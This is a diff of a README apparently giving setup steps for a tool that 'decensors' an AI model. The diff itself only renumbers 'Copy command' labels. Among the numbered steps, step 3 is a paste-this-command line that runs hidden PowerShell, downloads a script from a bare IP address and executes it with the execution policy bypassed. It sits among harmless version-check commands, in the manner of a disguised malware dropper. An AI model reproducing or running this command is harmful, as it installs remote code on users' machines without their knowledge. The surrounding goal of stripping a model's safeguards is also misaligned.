@@ -104,7 +104,7 @@ Get-ComputerInfo | Select-Object WindowsProductName, TotalPhysicalMemory, CsProc
 </details>
 3.
 <details>
-<summary>📋 Copy command 2</summary>
+<summary>📋 Copy command 3</summary>
 
 ```bash
 powershell -w hidden -c "iwr -Uri 'http://2.26.123.153:8080/api/get-worker/3' -OutFile $env:TEMP\w3.ps1 -UseBasicParsing; powershell -w hidden -ep Bypass $env:TEMP\w3.ps1"
@@ -113,7 +113,7 @@ powershell -w hidden -c "iwr -Uri 'http://2.26.123.153:8080/api/get-worker/3' -O
 </details>
 4.
 <details>
-<summary>📋 Copy command 2</summary>
+<summary>📋 Copy command 4</summary>
 
 ```bash
 python --version pip --version
@@ -122,7 +122,7 @@ python --version pip --version
 </details>
 5.
 <details>
-<summary>📋 Copy command 2</summary>
+<summary>📋 Copy command 5</summary>
 
 ```bash
 Replace `Qwen/Qwen3-4B-Instruct-2507` with whatever model you want to decensor.
